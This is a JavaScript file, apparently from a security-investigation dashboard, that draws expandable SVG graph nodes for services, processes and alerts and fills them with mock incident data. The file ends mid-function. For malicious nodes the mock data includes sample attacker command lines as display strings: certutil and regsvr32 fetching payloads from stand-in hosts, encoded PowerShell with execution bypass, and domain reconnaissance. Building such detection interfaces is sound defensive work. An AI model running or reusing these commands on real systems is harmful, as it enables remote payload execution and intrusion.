/* graph-nodes.js — Dynamic node creation, cascading data, drill-down, collapse
 * Depends on: entities.js, display-config.js, graph-core.js, graph-summary.js, utils.js */
function generateCascadingData(category, label, parentEid, isMalicious, selfNodeId) {
  const parentEntity = ENTITIES[parentEid];
  const parentName = parentEntity ? parentEntity.modalTitle : parentEid;
  const self = selfNodeId || parentEid;
  const ts = '03 Apr 2026';

  const sections = {};

  if (category === 'service') {
    // ── Service node → can have related alerts, processes, and config
    const svcName = (label || 'Unknown Service').replace(/[^a-zA-Z0-9\s.-]/g, '');
    sections.recentAlerts = {
      label: 'Recent Alerts', expanded: false, viewAll: true,
      timeline: isMalicious ? [
        { time:`${ts}  15:36:55`, dot:'red', malicious: true,
          viewOnGraph: { nodeId: `aler-ctx-${self}-0`, label: 'Suspicious Service Install', icon:'🔔', sourceEntity: self },
          alertProfileId: 'alert-sus-service',
          detailsGrid: [
            { label:`15:36:55 Suspicious Service Install`, value:`${svcName} installed by non-admin`, tag:'Type', tagVal:'ANOMALY', source: parentName.split('·').pop()?.trim() || 'Unknown', status:'Open', severity:'High' }
          ] },
        { time:`${ts}  15:37:12`, dot:'red', malicious: true,
          viewOnGraph: { nodeId: `aler-ctx-${self}-1`, label: 'Outbound C2 Connection', icon:'🔔', sourceEntity: self },
          alertProfileId: 'alert-c2-conn',
          detailsGrid: [
            { label:`15:37:12 Outbound C2 Connection`, value:`${svcName} → External IP on port 443`, tag:'Type', tagVal:'THREAT', source: svcName, status:'Open', severity:'Critical' }
          ] }
      ] : [
        { time:`${ts}  14:30:00`, dot:'orange',
          viewOnGraph: { nodeId: `aler-ctx-${self}-0`, label: 'Service State Change', icon:'🔔', sourceEntity: self },
          detailsGrid: [
            { label:`14:30:00 Service State Change`, value:`${svcName} restarted unexpectedly`, tag:'Type', tagVal:'OPERATIONAL', source: svcName, status:'Closed', severity:'Medium' }
          ] }
      ]
    };
    sections.processes = {
      label: 'Processes Spawned', expanded: false, viewAll: true,
      timeline: isMalicious ? [
        { time:`${ts}  15:37:05`, dot:'red', malicious: true,
          viewOnGraph: { nodeId: `proc-ctx-${self}-0`, label: 'svchost_update.exe', icon:'⚙', sourceEntity: self },
          details: { 'Process Name':'svchost_update.exe', 'Parent Process': svcName, 'PID':'6142', 'Command Line':`${svcName}.exe -nop -exec bypass`, 'User':'NT AUTHORITY\\SYSTEM' } },
        { time:`${ts}  15:37:18`, dot:'red', malicious: true,
          viewOnGraph: { nodeId: `proc-ctx-${self}-1`, label: 'certutil.exe', icon:'⚙', sourceEntity: self },
          details: { 'Process Name':'certutil.exe', 'Parent Process': svcName, 'PID':'6201', 'Command Line':'certutil -urlcache -split -f http://staging-payload.net/update.dll', 'User':'NT AUTHORITY\\SYSTEM' } }
      ] : [
        { time:`${ts}  14:30:05`, dot:'green',
          viewOnGraph: { nodeId: `proc-ctx-${self}-0`, label: `${svcName}.exe`, icon:'⚙', sourceEntity: self },
          details: { 'Process Name': `${svcName}.exe`, 'Parent Process':'services.exe', 'PID':'2048', 'Command Line': `${svcName}.exe --start`, 'User':'NT AUTHORITY\\SYSTEM' } }
      ]
    };
    sections.serviceTriggered = {
      label: 'Dependent Services', expanded: false, viewAll: true,
      timeline: isMalicious ? [
        { time:`${ts}  15:37:30`, dot:'red', malicious: true,
          viewOnGraph: { nodeId: `serv-ctx-${self}-0`, label: 'CryptoSvc', icon:'🔧', sourceEntity: self },
          details: { 'Service Name':'CryptoSvc', 'Display name':'Cryptographic Services', 'Startup type':'Manual', 'host':'NT AUTHORITY\\SYSTEM', 'Status':'Started by ' + svcName, 'Severity':'High' } }
      ] : [
        { time:`${ts}  14:30:10`, dot:'green',
          viewOnGraph: { nodeId: `serv-ctx-${self}-0`, label: 'EventLog', icon:'🔧', sourceEntity: self },
          details: { 'Service Name':'EventLog', 'Display name':'Windows Event Log', 'Startup type':'Automatic', 'host':'Local Service', 'Status':'Running', 'Severity':'Normal' } }
      ]
    };
  }

  else if (category === 'process') {
    // ── Process node → can have child processes, services it touched, alerts
    const procName = (label || 'Unknown Process').replace(/[^a-zA-Z0-9\s.-]/g, '');
    // Use depth-aware child names to avoid label collisions with existing nodes
    const depth = (parentEid.match(/-ctx-/g) || []).length;
    const childProcs = isMalicious
      ? (depth < 1
        ? [{ name: 'cmd.exe', cmd: 'cmd.exe /c whoami /all > C:\\temp\\recon.txt', pid: '7320' },
           { name: 'net.exe', cmd: 'net user /domain', pid: '7456' }]
        : (depth < 2
          ? [{ name: 'powershell.exe', cmd: 'powershell -nop -ep bypass -enc <base64>', pid: '8010' },
             { name: 'wmic.exe', cmd: 'wmic process list brief', pid: '8120' }]
          : [{ name: 'mshta.exe', cmd: 'mshta vbscript:Execute("…")', pid: '9200' },
             { name: 'regsvr32.exe', cmd: 'regsvr32 /s /n /u /i:http://evil/shell.sct scrobj.dll', pid: '9310' }]
        ))
      : [{ name: 'conhost.exe', cmd: 'conhost.exe 0x4', pid: '3102' }];
    sections.recentAlerts = {
      label: 'Triggered Alerts', expanded: false, viewAll: true,
      timeline: isMalicious ? [
        { time:`${ts}  15:38:10`, dot:'red', malicious: true,
          viewOnGraph: { nodeId: `aler-ctx-${self}-0`, label: 'Encoded Command Execution', icon:'🔔', sourceEntity: self },
          alertProfileId: 'alert-enc-powershell',
          detailsGrid: [
            { label:`15:38:10 Encoded Command Execution`, value:`${procName} ran obfuscated payload`, tag:'Type', tagVal:'THREAT', mitre:'PowerShell (T1059.001)', source: procName, status:'Open', severity:'Critical' }
          ] },
        { time:`${ts}  15:38:22`, dot:'red', malicious: true,
          viewOnGraph: { nodeId: `aler-ctx-${self}-1`, label: 'Credential Dump Attempt', icon:'🔔', sourceEntity: self },
          alertProfileId: 'alert-sam-access',
          detailsGrid: [
            { label:`15:38:22 Credential Dump Attempt`, value:`${procName} accessed LSASS memory`, tag:'Type', tagVal:'THREAT', mitre:'LSASS Memory (T1003.001)', source: procName, status:'Open', severity:'Critical' }
          ] }
      ] : [
        { time:`${ts}  14:25:00`, dot:'green',
          viewOnGraph: { nodeId: `aler-ctx-${self}-0`, label: 'Normal Execution', icon:'⚙', sourceEntity: self },
          detailsGrid: [
            { label:`14:25:00 Normal Execution`, value:`${procName} completed normally`, tag:'Type', tagVal:'INFO', source: procName, status:'Closed', severity:'Low' }
          ] }
      ]
    };
    sections.processes = {
      label: 'Child Processes', expanded: false, viewAll: true,
      timeline: childProcs.map((cp, idx) => ({
        time: `${ts}  15:38:${String(5 + idx * 10).padStart(2, '0')}`,
        dot: isMalicious ? 'red' : 'green',
        malicious: isMalicious || undefined,
        viewOnGraph: { nodeId: `proc-ctx-${self}-${idx}`, label: cp.name, icon:'⚙', sourceEntity: self },
        details: { 'Process Name': cp.name, 'Parent Process': procName, 'PID': cp.pid, 'Command Line': cp.cmd, 'User': parentName.split('·').pop()?.trim() || 'SYSTEM' }
      }))
    };
    sections.serviceTriggered = {
      label: 'Services Invoked', expanded: false, viewAll: true,
      timeline: isMalicious ? [
        { time:`${ts}  15:38:20`, dot:'red', malicious: true,
          viewOnGraph: { nodeId: `serv-ctx-${self}-0`, label: 'WinRM', icon:'🔧', sourceEntity: self },
          details: { 'Service Name':'WinRM', 'Display name':'Windows Remote Management', 'Startup type':'Manual', 'host':'NT AUTHORITY\\NETWORK SERVICE', 'Status':'Started by ' + procName, 'Severity':'Critical' } },
        { time:`${ts}  15:38:25`, dot:'orange',
          viewOnGraph: { nodeId: `serv-ctx-${self}-1`, label: 'Task Scheduler', icon:'🔧', sourceEntity: self },
          details: { 'Service Name':'Schedule', 'Display name':'Task Scheduler', 'Startup type':'Automatic', 'host':'Local System', 'Status':'Task created by ' + procName, 'Severity':'High' } }
      ] : [
        { time:`${ts}  14:25:05`, dot:'green',
          viewOnGraph: { nodeId: `serv-ctx-${self}-0`, label: 'Print Spooler', icon:'🔧', sourceEntity: self },
          details: { 'Service Name':'Spooler', 'Display name':'Print Spooler', 'Startup type':'Automatic', 'host':'Local System', 'Status':'Running', 'Severity':'Normal' } }
      ]
    };
  }

  else if (category === 'alert') {
    // ── Alert node → can have related processes and services involved
    const alertName = (label || 'Unknown Alert').replace(/[^a-zA-Z0-9\s.-]/g, '');
    sections.processes = {
      label: 'Processes Involved', expanded: false, viewAll: true,
      timeline: isMalicious ? [
        { time:`${ts}  15:39:01`, dot:'red', malicious: true,
          viewOnGraph: { nodeId: `proc-ctx-${self}-0`, label: 'powershell.exe', icon:'⚙', sourceEntity: self },
          details: { 'Process Name':'powershell.exe', 'Parent Process':'cmd.exe', 'PID':'8120', 'Command Line':'powershell -ep bypass -f C:\\temp\\beacon.ps1', 'User':'m.henderson' } },
        { time:`${ts}  15:39:10`, dot:'red', malicious: true,
          viewOnGraph: { nodeId: `proc-ctx-${self}-1`, label: 'rundll32.exe', icon:'⚙', sourceEntity: self },
          details: { 'Process Name':'rundll32.exe', 'Parent Process':'powershell.exe', 'PID':'8244', 'Command Line':'rundll32.exe svchost_update.dll,DllMain', 'User':'SYSTEM' } }
      ] : [
        { time:`${ts}  14:20:00`, dot:'green',
          viewOnGraph: { nodeId: `proc-ctx-${self}-0`, label: 'svchost.exe', icon:'⚙', sourceEntity: self },
          details: { 'Process Name':'svchost.exe', 'Parent Process':'services.exe', 'PID':'1200', 'Command Line':'svchost.exe -k netsvcs', 'User':'SYSTEM' } }
      ]
    };
    sections.serviceTriggered = {
      label: 'Services Affected', expanded: false, viewAll: true,
      timeline: isMalicious ? [
        { time:`${ts}  15:39:15`, dot:'red', malicious: true,
          viewOnGraph: { nodeId: `serv-ctx-${self}-0`, label: 'WinDefend', icon:'🔧', sourceEntity: self },
          details: { 'Service Name':'WinDefend', 'Display name':'Windows Defender', 'Startup type':'Automatic', 'host':'Local System', 'Status':'Stopped (tampered)', 'Severity':'Critical' } }
      ] : [
        { time:`${ts}  14:20:05`, dot:'green',
          viewOnGraph: { nodeId: `serv-ctx-${self}-0`, label: 'EventLog', icon:'🔧', sourceEntity: self },
          details: { 'Service Name':'EventLog', 'Display name':'Windows Event Log', 'Startup type':'Automatic', 'host':'Local Service', 'Status':'Running', 'Severity':'Normal' } }
      ]
    };
    sections.recentAlerts = {
      label: 'Correlated Alerts', expanded: false, viewAll: true,
      timeline: isMalicious ? [
        { time:`${ts}  15:39:30`, dot:'red', malicious: true,
          viewOnGraph: { nodeId: `aler-ctx-${self}-0`, label: 'Lateral Movement', icon:'🔔', sourceEntity: self },
          alertProfileId: 'alert-impossible-travel',
          detailsGrid: [
            { label:`15:39:30 Lateral Movement Attempt`, value:`RDP to DC-01 from compromised host`, tag:'Type', tagVal:'CORRELATION', mitre:'Remote Desktop Protocol (T1021.001)', source: 'CORP-WS-045', status:'Open', severity:'Critical' }
          ] }
      ] : []
    };
  }

  return sections;
}

/* ── Helper: branch child nodes from entity data ─────────────── */
function branchChildNodes(parentEid, category, entries, edgeLabel, iconChar, colorConfig) {
  const svg = document.getElementById('graphSvg');
  const ns = 'http://www.w3.org/2000/svg';
  const srcCircle = document.querySelector(`#graphSvg g.graph-node[data-entity="${parentEid}"] circle:not(.expand-indicator)`);
  if (!srcCircle || !svg) return;
  const srcCx = parseFloat(srcCircle.getAttribute('cx'));
  const srcCy = parseFloat(srcCircle.getAttribute('cy'));
  const firstG = svg.querySelector('g.graph-node');

  if (!drillDownGroups[parentEid]) drillDownGroups[parentEid] = {};
  if (!drillDownGroups[parentEid][category]) drillDownGroups[parentEid][category] = [];

  // If already expanded, collapse instead (toggle)
  if (drillDownGroups[parentEid][category].length > 0) {
    collapseCategory(parentEid, category);
    return 'collapsed';
  }

  // Base angle per category to spread them in different directions
  const baseAngles = { alert: -Math.PI * 0.6, process: Math.PI * 0.2, service: Math.PI * 0.7 };
  const baseAngle = baseAngles[category] || 0;
  let created = 0;

  entries.forEach((entry, i) => {
    let label = entry.details?.[colorConfig.labelKey] || entry.details?.[colorConfig.altLabelKey] || entry.details?.['Alert'] || '';
    // Handle detailsGrid format (used by recent alerts)
    if (!label && entry.detailsGrid && entry.detailsGrid[0]) {
      label = entry.detailsGrid[0].label.replace(/^[\d:]+\s*/, '');
    }
    if (!label) label = category + ' ' + (i + 1);
    // Check by label if node already exists on graph
    const existing = findNodeByLabel(label);
    if (existing) {
      const existNodeId = existing.getAttribute('data-entity');
      if (!existNodeId) return;

      // Check if an edge already exists from this parent to that node
      const alreadyLinked = svg.querySelector('line[data-source="' + parentEid + '"][data-target="' + existNodeId + '"]');
      if (alreadyLinked) {
        // Just pulse — already connected
        existing.style.transition = 'transform 0.3s ease';
        existing.style.transform = 'scale(1.3)';
        setTimeout(() => { existing.style.transform = 'scale(1)'; }, 500);
        return;
      }

      // Create a cross-edge from this parent to the existing node
      const existCircle = existing.querySelector('circle:not(.expand-indicator)');
      const tgtCx = existCircle ? parseFloat(existCircle.getAttribute('cx')) : 0;
      const tgtCy = existCircle ? parseFloat(existCircle.getAttribute('cy')) : 0;

      const isMal = !!entry.malicious;
      const crossEdge = document.createElementNS(ns, 'line');
      crossEdge.setAttribute('x1', srcCx); crossEdge.setAttribute('y1', srcCy);
      crossEdge.setAttribute('x2', tgtCx); crossEdge.setAttribute('y2', tgtCy);
      crossEdge.setAttribute('class', isMal ? 'graph-edge-mal' : 'graph-edge-norm');
      crossEdge.setAttribute('data-source', parentEid);
      crossEdge.setAttribute('data-target', existNodeId);
      crossEdge.setAttribute('data-label', edgeLabel);
      crossEdge.setAttribute('stroke-dasharray', '6,3'); // dashed to indicate cross-link
      crossEdge.style.opacity = '0';
      if (firstG) svg.insertBefore(crossEdge, firstG); else svg.appendChild(crossEdge);

      const crossLbl = document.createElementNS(ns, 'text');
      crossLbl.setAttribute('x', (srcCx + tgtCx) / 2);
      crossLbl.setAttribute('y', (srcCy + tgtCy) / 2 - 6);
      crossLbl.setAttribute('text-anchor', 'middle'); crossLbl.setAttribute('font-size', '7.5');
      crossLbl.setAttribute('fill', isMal ? '#dc2626' : '#2563eb');
      crossLbl.setAttribute('font-family', 'IBM Plex Mono,monospace');
      crossLbl.setAttribute('style', 'paint-order:stroke fill;stroke:#f5f7fa;stroke-width:3px;');
      crossLbl.setAttribute('data-source', parentEid);
      crossLbl.setAttribute('data-target', existNodeId);
      crossLbl.textContent = edgeLabel;
      crossLbl.style.opacity = '0';
      if (firstG) svg.insertBefore(crossLbl, firstG); else svg.appendChild(crossLbl);

      // Animate edge in
      requestAnimationFrame(() => {
        crossEdge.style.transition = 'opacity 0.4s ease';
        crossLbl.style.transition = 'opacity 0.4s ease 0.1s';
        crossEdge.style.opacity = '0.7'; crossLbl.style.opacity = '1';
      });

      // Track with gEl: null → collapse will only remove the edge, not the node
      drillDownGroups[parentEid][category].push({
        nodeId: existNodeId, gEl: null, edgeEl: crossEdge, lblEl: crossLbl, crossLink: true
      });

      // Pulse the existing node
      existing.style.transition = 'transform 0.3s ease';
      existing.style.transform = 'scale(1.3)';
      setTimeout(() => { existing.style.transform = 'scale(1)'; }, 500);
      return;
    }

    const nodeId = `${category.substring(0,4)}-ctx-${parentEid}-${i}`;
    if (document.querySelector(`#graphSvg g.graph-node[data-entity="${nodeId}"]`)) return;

    // Create dynamic ENTITIES entry so the child node shows its own details in the slider
    const isMal = !!entry.malicious;
    const parentEntity = ENTITIES[parentEid];
    const parentLabel = parentEntity ? parentEntity.modalTitle : parentEid;
    const ts = '03 Apr 2026';

    // Build rich sections based on category (matching static entity structure)
    const builtSections = {};

    if (category === 'process') {
      const procName = (label || 'Unknown').replace(/[^a-zA-Z0-9\s.\-_]/g, '');
      const pid = entry.details?.['PID'] || String(4000 + Math.floor(Math.random()*4000));
      const cmdLine = entry.details?.['Command Line'] || `${procName}`;
      const parentProc = entry.details?.['Parent Process'] || 'explorer.exe';
      const user = entry.details?.['User'] || 'm.henderson';
      builtSections.riskSummary = {
        label: 'Risk Summary', expanded: true, noCollapse: true,
        summaryCard: {
          riskScore: isMal ? (70 + Math.floor(Math.random()*25)) : (10 + Math.floor(Math.random()*30)),
          maxScore: 100,
          severity: isMal ? 'Critical' : 'Low',
          statusBadge: isMal ? 'Suspicious Execution' : 'Normal Process',
          metrics: isMal ? [
            { icon:'⚠', label:'Anomaly Score', value:'High', color:'#dc2626' },
            { icon:'🔗', label:'Network Connections', value:'2', color:'#ea580c' },
            { icon:'📦', label:'Files Dropped', value:'1', color:'#dc2626' },
            { icon:'🔐', label:'Privilege Level', value:'Medium', color:'#d97706' },
            { icon:'🧬', label:'Obfuscation', value: cmdLine.includes('enc') ? 'Encoded' : 'None', color:'#ea580c' },
            { icon:'📊', label:'Child Processes', value:'2', color:'#d97706' }
          ] : [
            { icon:'✓', label:'Anomaly Score', value:'Low', color:'#16a34a' },
            { icon:'🔗', label:'Network Connections', value:'0', color:'#16a34a' },
            { icon:'📊', label:'Child Processes', value:'1', color:'#16a34a' }
          ],
          firstSeen: `${ts} 15:36:22`,
          lastActivity: `${ts} 15:37:01`,
          investigationStatus: isMal ? 'Active — Review recommended' : 'Normal — No action needed'
        }
      };
      builtSections.processDetails = {
        label: 'Process Details', expanded: true,
        kv: { 'Process Name': procName, 'PID': pid, 'Parent Process': parentProc, 'Command Line': cmdLine, 'User': `<a class="em-link" style="cursor:pointer;font-weight:600" onclick="openEntitySlider('${parentEid}')">${user}</a>`, 'Integrity Level': isMal ? 'Medium' : 'Low', 'Start Time': `${ts}  15:36:22`, 'Status': 'Running', 'Signature': isMal ? 'Unknown ⚠' : 'Microsoft (Valid)' }
      };
    } else if (category === 'service') {
      const svcName = (label || 'Unknown').replace(/[^a-zA-Z0-9\s.\-_]/g, '');
      const displayName = entry.details?.['Display name'] || svcName;
      const startupType = entry.details?.['Startup type'] || 'Automatic';
      const host = entry.details?.['host'] || 'NT AUTHORITY\\SYSTEM';
      builtSections.riskSummary = {
        label: 'Risk Summary', expanded: true, noCollapse: true,
        summaryCard: {
          riskScore: isMal ? (65 + Math.floor(Math.random()*30)) : (5 + Math.floor(Math.random()*20)),
          maxScore: 100,
          severity: isMal ? 'High' : 'Low',
          statusBadge: isMal ? 'Suspicious Service' : 'Normal Service',
          metrics: isMal ? [
            { icon:'⚠', label:'Service Anomaly', value:'Detected', color:'#dc2626' },
            { icon:'🔧', label:'Startup Type', value: startupType, color:'#ea580c' },
            { icon:'🔗', label:'Dependent Services', value:'1', color:'#d97706' },
            { icon:'📊', label:'Processes Spawned', value:'2', color:'#dc2626' }
          ] : [
            { icon:'✓', label:'Service Status', value:'Normal', color:'#16a34a' },
            { icon:'🔧', label:'Startup Type', value: startupType, color:'#16a34a' },
            { icon:'📊', label:'Processes Spawned', value:'1', color:'#16a34a' }
          ],
          firstSeen: `${ts} 14:30:00`,
          lastActivity: `${ts} 15:37:30`,
          investigationStatus: isMal ? 'Active — Stop service recommended' : 'Normal — No action needed'
        }
      };
      builtSections.serviceDetails = {
        label: 'Service Details', expanded: true,
        kv: { 'Service Name': svcName, 'Display Name': displayName, 'Startup Type': startupType, 'Run As': host, 'Status': isMal ? 'Running ⚠' : 'Running', 'Binary Path': isMal ? `C:\\Windows\\Temp\\${svcName.toLowerCase()}.exe ⚠` : `C:\\Windows\\System32\\${svcName.toLowerCase()}.exe`, 'Parent Entity': `<a class="em-link" style="cursor:pointer;font-weight:600" onclick="openEntitySlider('${parentEid}')">${parentLabel.split('·').pop()?.trim() || parentEid}</a>` }
      };
    } else if (category === 'alert') {
      const alertName = (label || 'Unknown').replace(/[^a-zA-Z0-9\s.\-_]/g, '');
      const severity = entry.detailsGrid?.[0]?.severity || (isMal ? 'Critical' : 'Low');
      const mitre = entry.detailsGrid?.[0]?.mitre || 'N/A';
      const source = entry.detailsGrid?.[0]?.source || 'CORP-WS-045';
      builtSections.riskSummary = {
        label: 'Risk Summary', expanded: true, noCollapse: true,
        summaryCard: {
          riskScore: isMal ? (75 + Math.floor(Math.random()*20)) : (15 + Math.floor(Math.random()*25)),
          maxScore: 100,
          severity: severity,
          statusBadge: isMal ? 'Active Alert' : 'Informational',
          metrics: isMal ? [
            { icon:'⚠', label:'Severity', value: severity, color:'#dc2626' },
            { icon:'🎯', label:'MITRE', value: mitre.split(' ')[0] || 'N/A', color:'#ea580c' },
            { icon:'🖥', label:'Source', value: source, color:'#d97706' },
            { icon:'🔗', label:'Correlated Alerts', value:'1', color:'#dc2626' }
          ] : [
            { icon:'✓', label:'Severity', value: severity, color:'#16a34a' },
            { icon:'🖥', label:'Source', value: source, color:'#16a34a' }
          ],
          firstSeen: `${ts} 15:38:00`,
          lastActivity: `${ts} 15:39:30`,
          investigationStatus: isMal ? 'Open — Needs triage' : 'Closed — Auto-resolved'
        }
      };
      builtSections.alertDetails = {
        label: 'Alert Details', expanded: true,
        kv: { 'Alert Name': alertName, 'Severity': severity, 'MITRE ATT&CK': mitre, 'Source': source, 'Status': isMal ? 'Open' : 'Closed', 'First Triggered': `${ts}  15:38:00`, 'Parent Entity': `<a class="em-link" style="cursor:pointer;font-weight:600" onclick="openEntitySlider('${parentEid}')">${parentLabel.split('·').pop()?.trim() || parentEid}</a>` }
      };
    }

    // Build the entity with rich sections first, then the raw details, then cascading
    ENTITIES[nodeId] = {
      type: category,
      modalTitle: category === 'process' ? `Process Details · ${label}` : category === 'service' ? `Service Details · ${label}` : `Alert Details · ${label}`,
      sections: {
        ...builtSections,
        details: {
          label: category.charAt(0).toUpperCase() + category.slice(1) + ' Raw Data',
          expanded: false,
          kv: entry.details || {}
        }
      }
    };
    if (entry.detailsGrid && entry.detailsGrid.length) {
      ENTITIES[nodeId].sections.detailsGrid = {
        label: 'Detailed Info',
        expanded: true,
        timeline: [{ time: entry.time || '', dot: entry.dot || 'amber', details: {}, detailsGrid: entry.detailsGrid }]
      };
    }

    // Inject cascading investigation data so this node can be further expanded
    const cascading = generateCascadingData(category, label, parentEid, isMal, nodeId);
    if (cascading) {
      Object.assign(ENTITIES[nodeId].sections, cascading);
    }

    const pos = findFreePosition(srcCx, srcCy, i, entries.length, baseAngle);
    const cx = pos.cx, cy = pos.cy;

    // Edge
    const edge = document.createElementNS(ns, 'line');
    edge.setAttribute('x1', srcCx); edge.setAttribute('y1', srcCy);
    edge.setAttribute('x2', cx); edge.setAttribute('y2', cy);
    edge.setAttribute('class', isMal ? 'graph-edge-mal' : 'graph-edge-norm');
    edge.setAttribute('data-source', parentEid);
    edge.setAttribute('data-target', nodeId);
    edge.setAttribute('data-label', edgeLabel);
    edge.style.opacity = '0';
    if (firstG) svg.insertBefore(edge, firstG); else svg.appendChild(edge);

    // Register display info for popup lookup
    if (!ENTITY_DISPLAY[nodeId]) {
      const typeIcon = { alert:'🔔', process:'⚙', service:'🔧' };
      const typeColor = { alert:'#ef4444', process:'#d97706', service:'#0891b2' };
      const typeBg = { alert:'#fef2f2', process:'#fffbeb', service:'#ecfeff' };
      ENTITY_DISPLAY[nodeId] = {
        icon: typeIcon[category] || iconChar,
        name: label.length > 20 ? label.substring(0, 18) + '…' : label,
        color: isMal ? (colorConfig.malStroke || '#ef4444') : (typeColor[category] || '#555'),
        bg: isMal ? '#fef2f2' : (typeBg[category] || '#f5f7fa')
      };
    }

    // Edge label
    const edgeLblEl = document.createElementNS(ns, 'text');
    edgeLblEl.setAttribute('x', (srcCx + cx) / 2);
    edgeLblEl.setAttribute('y', (srcCy + cy) / 2 - 6);
    edgeLblEl.setAttribute('text-anchor', 'middle'); edgeLblEl.setAttribute('font-size', '7.5');
    edgeLblEl.setAttribute('fill', isMal ? '#dc2626' : '#2563eb');
    edgeLblEl.setAttribute('font-family', 'IBM Plex Mono,monospace');
    edgeLblEl.setAttribute('style', 'paint-order:stroke fill;stroke:#f5f7fa;stroke-width:3px;');
    edgeLblEl.setAttribute('data-source', parentEid);
    edgeLblEl.setAttribute('data-target', nodeId);
    edgeLblEl.textContent = edgeLabel;
    edgeLblEl.style.opacity = '0';
    if (firstG) svg.insertBefore(edgeLblEl, firstG); else svg.appendChild(edgeLblEl);

    // Node group
    const g = document.createElementNS(ns, 'g');
    g.setAttribute('class', 'graph-node'); g.setAttribute('data-entity', nodeId);
    // Track investigation depth for visual chain analysis
    const parentDepth = parseInt(document.querySelector(`#graphSvg g.graph-node[data-entity="${parentEid}"]`)?.getAttribute('data-depth') || '0');
    g.setAttribute('data-depth', parentDepth + 1);
    g.setAttribute('onclick', `openEntitySlider('${nodeId}')`);
    g.setAttribute('oncontextmenu', `showGraphCtx(event,'${nodeId}')`);

    const circle = document.createElementNS(ns, 'circle');
    circle.setAttribute('cx', cx); circle.setAttribute('cy', cy);
    circle.setAttribute('r', '16'); circle.setAttribute('fill', '#ffffff');
    circle.setAttribute('stroke', isMal ? colorConfig.malStroke : colorConfig.normStroke);
    circle.setAttribute('stroke-width', '2');
    if (isMal) circle.setAttribute('filter', 'url(#glow-r)');

    // Add expandable indicator ring (shows this node can be drilled deeper)
    const hasCascade = entry.malicious || category !== 'alert'; // most nodes have cascading data
    if (hasCascade) {
      const expandRing = document.createElementNS(ns, 'circle');
      expandRing.setAttribute('cx', cx + 12); expandRing.setAttribute('cy', cy - 12);
      expandRing.setAttribute('r', '5'); expandRing.setAttribute('fill', '#ffffff');
      expandRing.setAttribute('stroke', '#8a94a6'); expandRing.setAttribute('stroke-width', '1');
      expandRing.setAttribute('class', 'expand-indicator');
      g.appendChild(expandRing);
      const expandPlus = document.createElementNS(ns, 'text');
      expandPlus.setAttribute('x', cx + 12); expandPlus.setAttribute('y', cy - 12);
      expandPlus.setAttribute('text-anchor', 'middle'); expandPlus.setAttribute('font-size', '8');
      expandPlus.setAttribute('dominant-baseline', 'central');
      expandPlus.setAttribute('fill', '#8a94a6'); expandPlus.setAttribute('font-weight', '700');
      expandPlus.setAttribute('class', 'expand-indicator');
      expandPlus.textContent = '+';
      g.appendChild(expandPlus);
    }

    const iconEl = document.createElementNS(ns, 'text');
    iconEl.setAttribute('x', cx); iconEl.setAttribute('y', cy + 4);
    iconEl.setAttribute('text-anchor', 'middle'); iconEl.setAttribute('font-size', '12');
    iconEl.setAttribute('dominant-baseline', 'central');
    iconEl.textContent = iconChar;

    const lblEl = document.createElementNS(ns, 'text');
    lblEl.setAttribute('x', cx); lblEl.setAttribute('y', cy + 26);
    lblEl.setAttribute('text-anchor', 'middle'); lblEl.setAttribute('font-size', '8.5');
    lblEl.setAttribute('fill', isMal ? colorConfig.malText : colorConfig.normText);
    lblEl.setAttribute('font-family', 'Lato,sans-serif');
    lblEl.setAttribute('font-weight', '600');
    const dispLabel = label.length > 20 ? label.substring(0, 18) + '…' : label;
    lblEl.textContent = dispLabel;

    g.appendChild(circle); g.appendChild(iconEl); g.appendChild(lblEl);
    svg.appendChild(g);

    // Make the branched node draggable
    makeNodeDraggable(g, circle, iconEl, lblEl, nodeId);

    // Register for dedup
    registerNode(nodeId, label);

    // Track for collapse
    drillDownGroups[parentEid][category].push({ nodeId, gEl: g, edgeEl: edge, lblEl: edgeLblEl });

    // Animate
    g.style.opacity = '0';
    requestAnimationFrame(() => {
      g.style.transition = 'opacity 0.4s ease ' + (i * 0.12) + 's';
      edge.style.transition = 'opacity 0.4s ease ' + (i * 0.12 + 0.08) + 's';
      edgeLblEl.style.transition = 'opacity 0.4s ease ' + (i * 0.12 + 0.12) + 's';
      g.style.opacity = '1'; edge.style.opacity = '0.7'; edgeLblEl.style.opacity = '1';
    });
    created++;
  });

  return created;
}

/* Collapse a specific category of children */
function collapseCategory(parentEid, category) {
  const group = drillDownGroups[parentEid]?.[category];
  if (!group || group.length === 0) return;
  const svg = document.getElementById('graphSvg');
  group.forEach(item => {
    // Always remove the edge & label from this parent
    if (item.edgeEl) { item.edgeEl.style.transition = 'opacity 0.3s ease'; item.edgeEl.style.opacity = '0'; setTimeout(() => item.edgeEl.remove(), 350); }
    if (item.lblEl) { item.lblEl.style.transition = 'opacity 0.3s ease'; item.lblEl.style.opacity = '0'; setTimeout(() => item.lblEl.remove(), 350); }

    // If this is a cross-link only (gEl is null), skip node removal entirely
    if (item.crossLink || !item.gEl) return;

    // Check if ANY other edge still connects to this node from another source
    const otherEdges = svg ? svg.querySelectorAll('line[data-target="' + item.nodeId + '"]') : [];
    const hasOtherConnection = Array.from(otherEdges).some(e => {
      // Exclude the edge we're about to remove (already fading)
      if (e === item.edgeEl) return false;
      // Exclude edges whose source is also being collapsed in this same group
      const eSrc = e.getAttribute('data-source');
      if (eSrc === parentEid) return false;
      return true;
    });

    if (hasOtherConnection) {
      // Node stays — it has other connections. Don't remove it or its data.
      return;
    }

    // Recursively collapse any children this node had expanded
    collapseAllChildren(item.nodeId);
    if (item.gEl) { item.gEl.style.transition = 'opacity 0.3s ease'; item.gEl.style.opacity = '0'; setTimeout(() => item.gEl.remove(), 350); }
    // Remove from registry & cleanup
    delete nodeRegistry[item.nodeId];
    delete ENTITIES[item.nodeId];
    delete ENTITY_DISPLAY[item.nodeId];
  });
  drillDownGroups[parentEid][category] = [];
  setTimeout(() => updateGraphSummary(), 400);
}

/* Recursively collapse ALL children of a node (all categories) */
function collapseAllChildren(nodeId) {
  const groups = drillDownGroups[nodeId];
  if (!groups) return;
  const svg = document.getElementById('graphSvg');
  for (const cat of Object.keys(groups)) {
    const items = groups[cat];
    if (!items || items.length === 0) continue;
    items.forEach(item => {
      // Always remove edge & label
      if (item.edgeEl) item.edgeEl.remove();
      if (item.lblEl) item.lblEl.remove();

      // Cross-links: only remove edge, not node
      if (item.crossLink || !item.gEl) return;

      // Check if node still has other connections from a different parent
      const otherEdges = svg ? svg.querySelectorAll('line[data-target="' + item.nodeId + '"]') : [];
      const hasOtherConnection = Array.from(otherEdges).some(e => {
        if (e === item.edgeEl) return false;
        const eSrc = e.getAttribute('data-source');
        if (eSrc === nodeId) return false;
        return true;
      });

      if (hasOtherConnection) return; // Node stays

